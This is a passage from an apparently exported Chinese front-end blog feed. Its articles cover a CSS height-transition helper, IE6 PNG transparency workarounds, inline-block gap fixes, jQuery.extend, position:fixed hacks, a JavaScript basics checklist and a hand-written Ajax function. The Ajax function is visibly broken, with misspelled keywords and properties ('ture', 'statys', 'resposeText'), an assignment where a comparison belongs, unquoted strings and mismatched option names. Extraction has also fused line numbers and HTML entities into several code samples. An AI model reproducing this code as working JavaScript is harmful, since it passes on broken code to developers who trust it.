傻眼了吧。大学时看过一部美国科幻片《心灵传输者》，其中男主也不是想瞬间位移就瞬间位移的，也是需要知道目的地和路径的。&emsp;&emsp;然而，当我们在一个div呈现动态内容的时候，由于我们并不知道里面的内容(都说了是动态的嘛)，所以，我们的height其实都是auto，于是，就算transition: height .35s走起，也不会有动画效果的，我们需要的是固定值。于是难点和关键点来了，如何赋予固定高度值？三、固定高度值与transition触发&emsp;&emsp;说白了很简单，当前高度固定值，获得动态内容载入后的高度固定值，再style设置，over~&emsp;&emsp;代码细节我就不讲了，其实没什么人关心的，“我需要的是代码，代码！”估计很多人心里是这么咆哮的。123456789101112131415// 高度无缝动画方法var funTransitionHeight = function(element, time) &#123; // time, 数值，可缺省 if (typeof window.getComputedStyle == "undefined") return; var height = window.getComputedStyle(element).height; element.style.transition = "none"; // 本行2015-05-20新增，mac Safari下，貌似auto也会触发transition, 故要none下~ element.style.height = "auto"; var targetHeight = window.getComputedStyle(element).height; element.style.height = height; element.offsetWidth = element.offsetWidth; if (time) element.style.transition = "height "+ time +"ms"; element.style.height = targetHeight;&#125;;十行出头点代码。element就是容器元素；如果transition你是写在CSS中的，time参数可以不要，例如：12element &#123; transition: height 250ms; overflow: hidden; &#125;funTransitionHeight(element)&emsp;&emsp;funTransitionHeight名字如果你不喜欢，可以自己改掉。IE9+有效，IE10+有动画，IE6~IE8老样子，所谓渐进增强。点击页面上“点击我”按钮，里面就有有高度不固定内容呈现，大伙儿就可以看到内容呈现时候不是砰砰砰了，而是歘歘歘~ &emsp;&emsp;如何调用？很简单，初始化时候funTransitionHeight()一下，赋个固定值；然后每次菊花完毕，内容载入后在funTransitionHeight()一下，动画就来啦。也就是说，相比你们以前的JS代码，就多了一行funTransitionHeight(element)调用而已，是不是实用又低成本！]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>css3体验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IE6 PNG透明终极解决方案]]></title>
    <url>%2F2015%2F07%2F12%2Fie6-png%E9%80%8F%E6%98%8E%E7%BB%88%E6%9E%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[方案1 - 滤镜解决方案：介绍：滤镜从IE4.0被微软正式引入，所以我们可以使用滤镜解决IE6的PNG透明问题，滤镜不仅可以实现目前CSS3的一些旋转效果而且还可以引入图片。注意：此方法在部分版本的IETest中无效，建议使用标准的IE6来进行测试！目录说明：思路：1、书写正常的CSS代码，通过background导入图片，这样所有的浏览器均使用了此PNG图片；1232、通过滤镜对引入图片，滤镜引入图片的时候是**相对于HTML文件，而不是相对于CSS文件**，语法如下：```filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src=&quot;images/grychengLogo.png&quot;);代码写到这里，我们放到IE6下测试后发现IE6还是没有透明，因为我们虽然设置了滤镜引入图片，但是background也同样加载了此图片，又因为background的图层比滤镜设置的高，所以才没有显示出来，如下图：3、所以我们得出的结论就是当我们使用filter的时候，就要使background失效，因此我们可以使用CSSHack来解决此问题，只需要将IE6的123```css_background:none;/*此代码只有IE6识别*/又因为filter只在IE6下让其产生作用，IE6+版本的浏览器虽然也识别filter，但是png透明是没有灰底问题的，所以我们同样将filter也加上IE6 Hack即可。4、最终我们可以得到如下代码：123456#pics&#123;background:url(../images/grychengLogo.png) no-repeat;/*以下为IE6设置PNG透明代码*/_background:none;_filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src="images/grychengLogo.png");&#125;提示：如果需要使其支持链接的hover，那么需要在CSS中定义12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152**优点：**1、绿色无插件；2、效率高，速度快；3、网速慢的时候，不会出现先灰底再透明的情况，支持远程图片；4、支持Hover等伪类，但是得使用两张图片，网速慢的情况下，会导致第二张图片暂时无法显示，因为还没有完全载入；**缺点：**1、不支持平铺，虽然filter有 ```sizingMethod=&quot;scale&quot;, &lt;/span&gt;```拉伸缩放模式，但是图片会变形，如果单纯的颜色或简单的渐变色还能横向平铺；2、不支持Img标签；3、不支持CSS Sprite；**使用情况：**1、当没有img引入png时可考虑；2、当没有CSS Sprite需求时可考虑；3、当没有平铺需求时候可考虑**[滤镜解决方案 - DEMO入口](http://demo.grycheng.com/case/ie6_png/filter/)*** * ***方案2 - HTC插件解决方案：****介绍：**从IE 5.5版本开始，Internet Explorer（IE）开始支持Web 行为的概念。这些行为是由后缀名为.htc的脚本文件描述的，它们定义了一套方法和属性，程序员几乎可以把这些方法和属性应用到HTML页面上的任何元素上去。**目录说明：**[![2](http://www.npm8.com/wp-content/uploads/2015/07/2.png)](http://www.npm8.com/wp-content/uploads/2015/07/2.png)**思路：**1、首先下载压缩文件 ![](http://www.w3cfuns.com/static/image/filetype/zip.gif)[htc.zip](http://www.npm8.com/wp-content/uploads/2015/07/htc.zip)2、复制并粘贴iepngfix.htc和blank.gif到您的网站文件夹中。3、在需要使用的PNG标签上定义如下，**相对于HTML文件的位置 （不相对于CSS文件！）**。例如，你可能看起来像这样：```css&lt;style type=&quot;text/css&quot;&gt;img,div&#123;behavior:url(style/iepngfix.htc);&#125;&lt;/style&gt;5、如果您的网站使用的子文件夹，打开。HTC文件，大约在第16行更改blankImg变量，修改blank.gif路径像这样：同样路径相对于HTML文件的位置 （不相对于CSS文件！）。= "images/blank.gif";```1236、复制并粘贴iepngfix.htc和blank.gif到您的网站文件夹中。```&lt;script type=&quot;text/javascript&quot; src=&quot;js/iepngfix_tilebg.js&quot;&gt;&lt;/script&gt;7、由于此js只有使用IE6时才有用，所以为了让我们的页面更加高效的执行，我们可以将上方代码修改如下，只有IE6的时候才调用执行此JavaScript：1&lt;!--[if IE 6]&gt;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;&lt;script type="text/javascript" src="../js/iepngfix_tilebg.js"&gt;&lt;/script&gt;&lt;/span&gt;&lt;span style="color: #708090;"&gt;&lt;![endif]--&gt;优点：1、一次性配置好，只需要像平时一样引入png图片，也不需要考虑png相对于html路径的问题，当目录有所变化，只需要修改htc文件或css中htc文件路径即可。2、支持平铺属性。3、不支持Img标签；4、不支持Hover等伪类；缺点：1、多引入了js、图片和htc，共三个文件；2、不支持CSS Sprite；3、当文件载入之前，会先暂时呈现灰底；使用情况：1、当没有img引入png时可考虑；2、当没有CSS Sprite需求时可考虑；3、PNG图片比较频繁修改时可考虑；htc解决方案 - DEMO入口方案3 - 纯CSS解决方案：介绍：虽说是纯CSS解决方案，但是也使用了JavaScript来运算，只不过是将脚本写到了CSS文件中，遗憾的是，此方案只支持img标签，对背景图片无效。目录说明：思路：1、首先下载透明的图片文件 blank.zip2、在需要设置透明的样式中加入下方代码，其中蓝色标注代码为刚才下载的透明图片，路径同样还是**相对于HTML文件的位置 （不相对于CSS文件！）：1234img&#123;_azimuth:expression(this.pngSet?this.pngSet=true:(this.nodeName == "IMG"&amp;&amp; this.src.toLowerCase().indexOf('.png')&gt;-1?(this.runtimeStyle.backgroundImage = "none",this.runtimeStyle.filter = "progid:DXImageTransform.Microsoft.AlphaImageLoader(src='" + this.src + "', sizingMethod='image')",this.src ="images/blank.gif"):(this.origBg = this.origBg? this.origBg :this.currentStyle.backgroundImage.toString().replace('url("','').replace('")',''),this.runtimeStyle.filter = "progid:DXImageTransform.Microsoft.AlphaImageLoader(src='" + this.origBg + "', sizingMethod='crop')",this.runtimeStyle.backgroundImage = "none")),this.pngSet=true);&#125;优点：CSS代码看起来似乎很优雅，至少没有乱七八糟的文件了，基本没有外加的文件，效率还算不错。缺点：1、多引入了一个本不应该存在的blank.gif图片文件；2、不支持背景图即Background；3、当文件载入之前，会先暂时呈现灰底；4、不支持Hover等伪类；使用情况：1、大部分透明的png存在于img标签中时可考虑；2、如果有背景图的可以参考上面所说的支持背景图的两种方式；纯css解决方案 - DEMO入口方案4 - 原生JavaScript解决方案：介绍：利用了方案1的滤镜原理来实现，但由于此javascript没有读取css文件中的样式，所以此方案同样只支持img标签，对背景图片无效。目录说明：思路：1、首先下载透明此方案所用到的js文件 iepngfix.zip2、由于此js只有使用IE6时才有用，所以为了让我们的页面更加高效的执行，我们可以将上方代码修改如下，只有IE6的时候才调用执行此JavaScript：1&lt;!--[if IE 6]&gt;&lt;script type="text/javascript" src="js/iepngfix.js"&gt;&lt;/script&gt;&lt;![endif]--&gt;优点：代码看起来似乎很优雅，基本没有外加的文件，效率还算不错。缺点：1、额外加入了js文件，增加http请求；2、不支持背景图即Background；3、当文件载入之前，会先暂时呈现灰底；4、不支持Hover等伪类；使用情况：1、大部分透明的png存在于img标签中时可考虑；2、如果有背景图的可以参考上面所说的支持背景图的两种方式；原生JavaScript解决方案 - DEMO入口方案5 - jQuery解决方案：介绍：jQuery为我们带来了很大的方便，jQuery没有让我们有太大的失望，img和png都同时得以支持，唯一美中不足的还是无法平铺，无法使用CSS Sprite。目录说明：思路：1、首先下载此方案所用到的js文件和透明gif jQueryPngFix.zip2、找到js文件中找到blankgif: ‘images/blank.gif’，将路径修改为相对于HTML文件的位置 （不相对于CSS或js文件！）3、由于此js只有使用IE6时才有用，所以为了让我们的页面更加高效的执行，我们可以将上方代码修改如下，只有IE6的时候才调用执行此JavaScript：1&lt;!--[if IE 6]&gt;&lt;script type="text/javascript" src="js/pngfix.js"&gt;&lt;/script&gt;&lt;![endif]--&gt;优点：1、CSS代码看起来很优雅，只需要引入js进行简单的配置一下就行了，效率还算不错；2、支持背景图，支持img；缺点：1、额外加入了js文件和图片文件，增加http请求；2、加载了一个庞大的jQuery类库；3、多库共存的时候可能会出现问题；4、不支持平铺；5、不支持CSS Sprite；6、当文件载入之前，会先暂时呈现灰底；7、不支持Hover等伪类；使用情况：当您的项目中使用jQuery的时可以考虑；jQuery解决方案 - DEMO入口方案6 - PNG8格式的图片解决方案：介绍：png8和gif都是8位的透明度，IE6与生俱来就支持png8的索引色透明度，但不支持png或8位以上的 alpha 透明度。而对于非动画的GIF建议你使用PNG8，因为体积会更小~思路：想将png24转换成png8，方法也很简单，使用photoshop转换就可以了。png24转换成png8的具体方法为：文件-》存储为web和设备所用格式-》在“预设”里，选择“PNG-8”和“”透明度，保存即可。优缺点：将一些复杂的png24的图片(比如：有阴影)转换为png8格式，显示效果不理想，而针对色调简单的图片，png8的效果楼主的方法还是很不错的！方案7 - DD_belatedPNG解决方案：介绍：我们都知道在目前所用的png图片透明解决方案基本都是使用滤镜、xpression解决的、透明gif替代。但是这些方法都有一个缺点,就是不支持CSS中backgrond-position与background-repeat。而这次的js插件使用了微软的VML语言进行绘制且不需要引入其他文件，一个小小的js就可以完美解决png图片bug就连img标签和hover伪类也可以很好的解决。目录说明：思路：1、首先下载此方案所用到的文件，DD_belatedPNG.zip2、引入刚下载的js文件，同样由于此js只有使用IE6时才有用，所以为了让我们的页面更加高效的执行，我们可以将上方代码修改如下，只有IE6的时候才调用执行此JavaScript：1&lt;!--[if IE 6]&gt;&lt;script type="text/javascript" src="js/DD_belatedPNG.js"&gt;&lt;/script&gt;&lt;![endif]--&gt;3、调用函数，设置参数如下：123其中传入的参数为所使用png图片的标签的ID、类样式和标签名称，同样也可以按照下方这样来写```DD_belatedPNG.fix(&quot;#content img&quot;);此方法则表示#content下的所有img标签透明如果为链接和链接的hover设置透明，那么您按照下方这么来写，在部分版本里面可以不用加入:hover直接写选择器即可，但是为了保险，建议咱们还是加上:hover：1234567写到这里并且您使用过jQuery或者CSSQuery类库，那么您一定熟悉上面的这种选择方法，总之就是，在CSS中您是如何选择的元素，那么在这个js函数（方法）中传入什么，只不过多个选择的时候，使用逗号隔开即可。**KwooShung用此方法时的小技巧：**如果页面中存在很多png，DD_belatedPNG.fix();函数的参数岂不是很长？我们可以使用这种写法：```DD_belatedPNG.fix(&quot;.pngFix,.pngFix:hover&quot;);如果使用上述的写法，我们的html中只需要在相对应的标签上加入cbc pngFix"`，12345678使用此方法的时候，我们每次都要加载两个js文件或者写两个`&lt;script&gt;`标签才行，这样不太好，http请求会增多，那么我们可以打开DD_belatedPNG.js文件，在尾部加入如下代码即可：```javascriptwindow.onload = function()&#123;DD_belatedPNG.fix(&quot;.pngFix,.pngFix:hover&quot;);&#125;这样我们只需要引入此JS，在需要透明的标签上加入class=&quot;pngFix&quot;即可，简单 · 方便 · 快捷！优点：1、CSS代码无需任何修改，按照平时的思路来写即可；2、无需配置；3、没有多余的gif图片；4、支持img；5、支持平铺；6、支持CSS Sprite；8、支持Hover等伪类；&nbsp;缺点：1、额外加入了js文件（6.39k）和http请求，可以忽略不计；2、当文件载入之前，会先暂时呈现灰底；3、js文件过多的时候，可能会报错，导致js无法正常运行（这种情况极少出现，可以忽略不计）；&nbsp;使用情况：1、当前6种方法均不能解决问题的时候可考虑；2、当png图片过多的时候可考虑，因为png图片太多，使用前面的几个方法，有的会导致CSS代码冗余过多，还不如引入此文件划算；DD_belatedPNG解决方案 - DEMO入口&nbsp;方案8 - EvPng解决方案：介绍：此方案与第七种方案差不多，使用方法也如出一辙，效果也非常不错。目录说明：思路：1、首先下载此方案所用到的文件， EvPng.zip2、参考第七种方案的使用方法。优点：1、CSS代码无需任何修改，按照平时的思路来写即可；2、无需配置；3、没有多余的gif图片；4、支持img；5、支持平铺；6、支持CSS Sprite；8、支持Hover等伪类；缺点：1、额外加入了js文件（文件4.93k，比DD_belatedPNG的6.39k还小）和http请求，可以忽略不计；2、当文件载入之前，会先暂时呈现灰底；3、js文件过多的时候，可能会报错，导致js无法正常运行（这种情况极少出现，可以忽略不计）；4、使用CSS Sprite技术的hover效果在部分情况下top可能会有1像素的偏差。使用情况：1、当前7种方法均不能解决问题的时候可考虑；2、当DD_belatedPNG效果不理想的时候可以考虑；EvPng解决方案 - DEMO入口]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>ie6透明</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解决inline-block元素的空白间距]]></title>
    <url>%2F2015%2F07%2F11%2F%E8%A7%A3%E5%86%B3inline-block%E5%85%83%E7%B4%A0%E7%9A%84%E7%A9%BA%E7%99%BD%E9%97%B4%E8%B7%9D%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;有关于使用inline-block来代替float的讨论也蛮多的，最常说的就是使用inline-block来代替float进行布局，或者使用inline-block来实现元素的居中效果。，就是使用inline-block的元素之间会存在“4px”的空白间距。那么今天我们就一起来说说这个“4px”的问题。大家首先来看一个demo1234567&lt;ul&gt;&lt;li&gt;item1&lt;/li&gt;&lt;li&gt;item2&lt;/li&gt;&lt;li&gt;item3&lt;/li&gt;&lt;li&gt;item4&lt;/li&gt;&lt;li&gt;item5&lt;/li&gt;&lt;/ul&gt;1234567891011121314151617*&#123;margin: 0;padding: 0;&#125;ul &#123;list-style: none outside none;padding: 10px;background: green;text-align: center;&#125;ul li &#123;display: inline-block;*display: inline;zoom: 1;background: orange;padding: 5px;&#125;上面的demo效果，明显的可以看出，在inline-block的元素之间存在“4px”的空白：上面截图是：IE8-9、Firefox、Safari等浏览器下的效果，换句话说，这种现像只有在这几种浏览器中才会出现。下面我们就来说说解决这个“4px”(Chrome下是8px)的几种方法：方法一：改变HTML结构简单一点的方法就是就是改变HTML的结构，你可以使用下面几种方法的任何一种都可以达到效果：结构一：12345678&lt;ul&gt;&lt;li&gt;item1&lt;/li&gt;&lt;li&gt;item2&lt;/li&gt;&lt;li&gt;item3&lt;/li&gt;&lt;li&gt;item4&lt;/li&gt;&lt;li&gt;item5&lt;/li&gt;&lt;/ul&gt;这种方法接近标签换行格式的写法，也更趋近阅读。结构二：1234567&lt;ul&gt;&lt;li&gt;item1&lt;/li&gt;&lt;li&gt;item2&lt;/li&gt;&lt;li&gt;item3&lt;/li&gt;&lt;li&gt;item4&lt;/li&gt;&lt;li&gt;item5&lt;/li&gt;&lt;/ul&gt;结构二和结构一极呼是一样，结束标签的“&gt;”成了另一行的起始标签。结构三：1234567&lt;ul&gt;&lt;li&gt;item1&lt;/li&gt;&lt;!––&gt;&lt;li&gt;item2&lt;/li&gt;&lt;!––&gt;&lt;li&gt;item3&lt;/li&gt;&lt;!––&gt;&lt;li&gt;item4&lt;/li&gt;&lt;!––&gt;&lt;li&gt;item5&lt;/li&gt;&lt;/ul&gt;结构三的方法采用的是html的注释的方法，这种方法我想大家不太常见，不过同样能解决我们需要解决的问题。结构四：1234567&lt;ul&gt; &lt;li&gt;item1&lt;/li&gt; &lt;li&gt;item2&lt;/li&gt; &lt;li&gt;item3&lt;/li&gt; &lt;li&gt;item4&lt;/li&gt; &lt;li&gt;item5&lt;/li&gt;&lt;/ul&gt;结构四，我想是大家常用来解决这样的问题的方法吧，下面我们来看看按上述几种方法写的效果：方法一所说的是通过标签来解决，虽然问题是解决了，但可以说不能称作是技巧。而且上面的方法只适合于写静态页面的时候，一旦你的HTML不是自己 写，而是后台生成，就比如CMS来说，标签后台生成，此时，我想大家又要骂街了，这可怎么办？其实我们除了上面的方法，还可以使用CSS来解决的。方法二：负的margin很多地方讨论使用负的margin来解决，比如说：1234567ul &#123;font-size: 12px;&#125;ul li &#123;margin-right: -4px;*margin-right: 0;&#125;这种解决方法并不完美，如果你的父元素设置的字号不一样，可能你的“-4px”就不能解决问题。况且在Chrome中你需要另外设置一个负的margin值才能实现同等的效果。当然有些文章介绍使用”-0.25em”来解决，这也是跟元素的字号有极大的关系。所以我个人建议不使用负的margin来解决这样的问题。方法三：设置父元素字体为0第三种方法设置父元素的字体为“0”，然后在“inline-block”元素上重置字体需要的大小。123456789101112131415ul &#123;list-style: none outside none;padding: 10px;background: green;text-align: center;font-size: 0px;&#125;ul li &#123;display: inline-block;*display: inline;zoom: 1;background: orange;padding: 5px;font-size: 12px;&#125;这样处理在Firexfox,chrome等浏览器下是达到了效果，可是在Safari下可问题依然存在：按此来说，方法三也不是绝佳的好方法，用不用大家自己考虑。方法四：丢失结束标签说实在的，这种方法又回到了方法一，在html标签上动手脚。就是让“inline-block”元素丢失关闭标签1234567&lt;ul&gt;&lt;li&gt;item1&lt;li&gt;item2&lt;li&gt;item3&lt;li&gt;item4&lt;li&gt;item5&lt;/ul&gt;样式基本不变，我们来看看效果：1&lt;pre&gt;这种方法虽然能达到各浏览器的兼容，但还是有一个前提，那就是“DOCTYPE”要选择对，在“XHTML”下可就问题又出来了。全兼容的样式解决方法经过高人指点，使用纯CSS还是找到了兼容的方法，就是在父元素中设置font-size:0,用来兼容chrome，而使用letter-space:-N px来兼容safari:12345678910111213.finally-solve &#123;letter-spacing: -4px;/*根据不同字体字号或许需要做一定的调整*/word-spacing: -4px;font-size: 0;&#125;.finally-solve li &#123;font-size: 16px;letter-spacing: normal;word-spacing: normal;display:inline-block;*display: inline;zoom:1;&#125;]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>inline-block空白</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery.extend 函数详解]]></title>
    <url>%2F2015%2F07%2F11%2Fjquery-extend-%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[JQuery的extend扩展方法：Jquery的扩展方法extend是我们在写插件的过程中常用的方法，该方法有一些重载原型，在此，我们一起去了解了解。一、Jquery的扩展方法原型是:1234它的含义是将src1,src2,src3...合并到dest中,返回值为合并后的dest,由此可以看出该方法合并后，是修改了dest的结构的。如果想要得到合并的结果却又不想修改dest的结构，可以如下使用：```javascriptvar newSrc=$.extend(&#123;&#125;,src1,src2,src3...)//也就是将&quot;&#123;&#125;&quot;作为dest参数。这样就可以将src1,src2,src3…进行合并，然后将合并结果返回给newSrc了。如下例：1var result=$.extend(&#123;&#125;,&#123;name:"Tom",age:21&#125;,&#123;name:"Jerry",sex:"Boy"&#125;)那么合并后的结果1result=&#123;name:"Jerry",age:21,sex:"Boy"&#125;也就是说后面的参数如果和前面的参数存在相同的名称，那么后面的会覆盖前面的参数值。二、省略dest参数上述的extend方法原型中的dest参数是可以省略的，如果省略了，则该方法就只能有一个src参数，而且是将该src合并到调用extend方法的对象中去，如：1、$.extend(src)该方法就是将src合并到jquery的全局对象中去，如：123$.extend(&#123;hello:function()&#123;alert('hello');&#125;&#125;);就是将hello方法合并到jquery的全局对象中。2、$.fn.extend(src)该方法将src合并到jquery的实例对象中去，如:123$.fn.extend(&#123;hello:function()&#123;alert('hello');&#125;&#125;);就是将hello方法合并到jquery的实例对象中。下面例举几个常用的扩展实例：1$.extend(&#123;net:&#123;&#125;&#125;);这是在jquery全局对象中扩展一个net命名空间。123$.extend($.net,&#123;hello:function()&#123;alert('hello');&#125;&#125;)这是将hello方法扩展到之前扩展的Jquery的net命名空间中去。三、Jquery的extend方法还有一个重载原型：1extend(boolean,dest,src1,src2,src3...)&nbsp;第一个参数boolean代表是否进行深度拷贝，其余参数和前面介绍的一致，什么叫深层拷贝，我们看一个例子：123var result=$.extend( true, &#123;&#125;,&#123; name: "John", location: &#123;city: "Boston",county:"USA"&#125; &#125;,&#123; last: "Resig", location: &#123;state: "MA",county:"China"&#125; &#125; );我们可以看出src1中嵌套子对象location:&#123; city:”Boston” &#125;,src2中也嵌套子对象location:&#123; state:”MA” &#125;,第一个深度拷贝参数为true，那么合并后的结果就是：12result=&#123;name:"John",last:"Resig",location:&#123;city:"Boston",state:"MA",county:"China"&#125;&#125;也就是说它会将src中的嵌套子对象也进行合并，而如果第一个参数boolean为false，我们看看合并的结果是什么，如下：1234var result=$.extend( false, &#123;&#125;,&#123; name: "John", location:&#123;city: "Boston",county:"USA"&#125; &#125;,&#123; last: "Resig", location: &#123;state: "MA",county:"China"&#125; &#125;);那么合并后的结果就是:1result=&#123;name:"John",last:"Resig",location:&#123;state:"MA",county:"China"&#125;&#125;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>jQuery.extend</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简单通用Ajax函数]]></title>
    <url>%2F2015%2F07%2F11%2F%E7%AE%80%E5%8D%95%E9%80%9A%E7%94%A8ajax%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;近日，总在纠结不懂Ajax原理，导致用JQuery做Ajax的时候，总是会碰到各种诡异的问题。身边的朋友也是一问三不知！正所谓，我不入地狱，谁入地狱。我不学习，等特么谁学习。。so~~看了1星期的Ajax历史、由来、原理等。。自己写了个通用源生javascript函数，希望能给大家一些启迪。Over，小二，上码！各位加油，理解万岁。&nbsp;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384//一个简单的执行ajax的通用函数//带一个参数，参数为对象，需要传送的东西，都在里面function ajax(options)&#123;//如果没有传入响应的值，就用默认的代替options = &#123;//HTTP请求类型type : options.type || "POST",//请求的URLurl : options.url || "www.XXX.com/XXX.php?",//请求的超时时间timeout : options.timeout || 5000,//请求失败、成功、完成onComplete : options.onComplete || function()&#123;alert(请求成功)&#125;,onError : options.onError || function()&#123;alert(请求失败)&#125;,onSuccess : options.onSuccess || function()&#123;alert(请求完成)&#125;,//服务器返回的数据类型,用于判断服务器返回的数据。从而进行操作date : options.date || " "&#125;//创建XML对象var xml = new XMLHttpRequest();//初始化异步请求xml.open(options.type,options.URL,ture);//记录请求是否成功完成var requestDone = false;//初试一个回调函数，用于取消函数setTimeout(function()&#123;requestDone = true;&#125;,options.timeout);//监听文档状态的更新xml.onreadystatechange = function()&#123;//保持等待，知道数据加载完成,并保证请求未超时if(xml.readyState == 4 &amp;&amp; !requestDone)&#123;//检查是否请求成功if(httpSuccess(xml))&#123;//以服务器返回的数据作为参数调用成功回调函数options.onSuccess(httpDate(xml,Date,options.type));&#125;else&#123;//否则就是发生了错误，执行Erroroptions.onError(); &#125;//调用完成回调函数options.onComplete();//避免内漏，清理文档xml = null;&#125;&#125;//建立与服务器的连接xml.send();//判断Http响应是否成功function httpSuccess(r)&#123;try&#123;//如果得不到服务器状态，且正在请求本地文件，则认为成功return !r.status &amp;&amp; location.protocolo = "file :" ||//所有200到300的状态码都认为成功(r.status &gt; 200 &amp;&amp; r.statys &lt; 300) ||//文档未被修改也算成功r.statys == 304 ||//safiri 在文档未被修改时返回空状态navigator.userAgent.indexof("Safiri") &gt;= 0 &amp;&amp; typeof r.status == "undefind";&#125;catch(e)&#123;&#125;//若检查状态失败，则假设请求失败return false;&#125;//从 Http 响应中解析正确数据function httpDate(r,type)&#123;//获取 content-type 的首部var ct = r.getResponseHeader("content-type");//若没有提供默认类型，则判断服务器返回的是否是 xml 数据var date = !type &amp;&amp; ct &amp;&amp; ct.indexof("xml") &gt;= 0;//若是，获取 xml 对象，否则返回文本内容date = type == "xml" || date ? r.resposeXML : r.resposeText;//若指定类型为 script ，则以 javascript 的形式执行返回文本if(type == "script")&#123;eval.call(window,date); &#125;//返回响应数据(或为xml或为字符串)return date;&#125; &#125;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>Ajax函数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习javascript必须掌握的基础知识]]></title>
    <url>%2F2015%2F07%2F11%2F%E5%AD%A6%E4%B9%A0javascript%E5%BF%85%E9%A1%BB%E6%8E%8C%E6%8F%A1%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[好多人想要学习前端……自学或者培训那么我们在学习过程中到底需要掌握那些基础知识呢！下面分类了JS中必备的知识也是必须要了解学会的！看一看你是否已经将JS的基础知识都了如指掌了呢？事件:onmousedown 鼠标按下onmouseup 鼠标抬起onmouseover 鼠标移入onmouseout 鼠标移除onmousemove 鼠标移动onclick 点击事件onfocus 获得焦点onblur 失去焦点oncontextmenu 鼠标右键onsubmit 表单提交//不会有冒泡的，坑onkeydown 键盘按下onkeyup 键盘抬起onload 页面加载onscroll 页面滚动onresize 窗口大小变化鼠标滚轮事件onmousewheel DOMMouseScroll输入框中value改变触发的事件onreadystatechangeattachEvent事件绑定（IE）addEventListenerevent对象clientX/clientY 鼠标当前窗口的位置取消冒泡cancelBubble键盘键值keyCode特殊的键值Event altKey、ctrlKey、shiftKey阻止默认事件preventDefault()return falseDOM操作:getElementById 获取ID元素getElementsByTagName 获取tag类元素childNodes 子节点 特殊浏览器包括默认的文本节点（换行等……）children 子节点firstChild/firstElementChildlastChild/lastElementChild兄弟节点nextSibling/nextElementSiblingpreviousSibing/previousElementSibingparentNode 父节点offsetParent 有定位属性的父节点nodeType 节点类型offsetWidth 元素的宽度（包括padding和border）offsetHeight 元素的高度（包括padding和border)clientWidth 可视区宽度clientHeight 可视区高度createElement 创建dom节点appendChild 插入子节点insertBefore 在子节点的第一个前面插入removeChild 删除子节点replaceChild 替换节点 并返回被替换元素BOM操作:window.open()window.close()window.locationwindow.location.searchwindow.location.hashwindow.navigator.userAgentjs基础:判断if elseswitch case? :循环forfor inwhile跳出循环continuebreak比较undefined null === == !定时器类setTimeoutclearTimeoutsetIntervalclearInterval参数集合arguments调回THIS指向callapplycallee数组和数组操作var arr = [];var arr = new Array();pushpopshiftunshiftsplicejoinsortconcat字符串操作splitsubstringindexOfcharAt正则var re = //;var re = new RegExp();searchmatchtestreplace*量词:{n,m} + * ?字符类: [^0-9]标识: i g首尾: ^ $转义: \d \s \b \wJS时间var oDate = new Date();getHours()getMinutes()getSeconds()getFullYear()getDay()getDate()setDate()图片预加载var oImg = new Image();常用方法:getByClass()getStyle()posLeft()veiwHeight()documentHeight()scrollY()first()last()next()pre()常用的JS操作应用加开关:bBtn加索引:index枚举递归迭代定时器alert/console.log测试JS运动类的应用匀速运动缓冲运动弹性运动碰撞运动运动框架编写/使用Math函数应用:maxminabsrandomceilfloorroundajax内容什么是ajax?post和get的区别?发送数据是什么样的?返回数据是什么样的?ajax的编写步骤?json怎么取?面向对象:什么是面向对象?引用类型是什么意思?原型是什么?面向对象怎么写?继承采用的方式?this指向理解?]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>JavaScript基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[position: fixed 的跨浏览器完美解决方案(支持IE5、6且无抖动)]]></title>
    <url>%2F2015%2F07%2F11%2Fposition-fixed-%E7%9A%84%E8%B7%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%8C%E7%BE%8E%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E6%94%AF%E6%8C%81ie5%E3%80%816%E4%B8%94%E6%97%A0%E6%8A%96%E5%8A%A8%2F</url>
    <content type="text"><![CDATA[position: fixed;这个属性用起来确实很方便，可以轻松的实现固定位置的浮动层效果。但是，它不支持IE6及以下版本。于是很多同学使用JS模拟。今天写了一个DEMO，涉及左侧、右侧。及上下两边，共四种位置的固定，与以往的教程不同的地方是，它使用CSS表达式来兼容IE5、IE6，且避免了js模拟时，拖动滚动条时出现抖动的问题，另外在IE5或者怪癖模式下也完全正常，没有任何问题。如果你有更好的方案，欢迎来喷我。下面是代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;position: fixed&lt;/title&gt;&lt;style type="text/css"&gt;* &#123;padding: 0;margin: 0;&#125;#content &#123;height: 5000px;width: 50%;border-right: 10px dotted red;&#125;#demo_t, #demo_b, #demo_l, #demo_r &#123;background: #f90;position: fixed;&#125;#demo_t, #demo_b &#123;left: 0;width: 100%;&#125;#demo_l, #demo_r &#123;width: 50px;top: 300px;&#125;#demo_t &#123;top: 0;&#125;#demo_b &#123;bottom: 0;&#125;#demo_l &#123;left: 0;&#125;#demo_r &#123;right: 0;&#125;&lt;/style&gt;&lt;!--[if lte 